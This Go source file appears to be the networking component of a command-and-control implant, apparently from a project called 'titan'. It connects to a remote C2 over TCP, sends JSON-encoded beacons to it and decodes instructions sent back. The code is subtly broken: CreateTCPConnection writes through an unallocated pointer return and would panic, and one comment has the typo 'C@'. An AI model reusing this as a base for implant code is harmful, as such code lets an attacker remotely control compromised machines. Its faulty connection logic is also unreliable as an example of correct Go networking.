package reiner

import (
	"encoding/json"
	"net"

	"github.com/BradHacker/titan/models"
)

// CreateTCPConnection connects to a remote C@ via TCP
func CreateTCPConnection(remoteHost string, remotePort string) (connection *net.Conn, err error) {
	*connection, err = net.Dial("tcp", remoteHost+":"+remotePort)
	return
}

// EncodeBeacon encodes a beacon response as a byte array for sending to the C2
func EncodeBeacon(beacon models.Beacon) (beaconBytes []byte, err error) {
	beaconBytes, err = json.Marshal(beacon)
	return
}

// SendBeacon sends a beacon response to the C2
func SendBeacon(beacon models.Beacon, connection net.Conn) (err error) {
	dataBytes, jsonErr := EncodeBeacon(beacon)
	if jsonErr != nil {
		return jsonErr
	}
	_, err = connection.Write(dataBytes)
	return
}

// DecodeInstruction decodes instructions sent from the C2
func DecodeInstruction(data []byte) (beacon *models.Instruction, err error) {
	err = json.Unmarshal(data, &beacon)
	return
}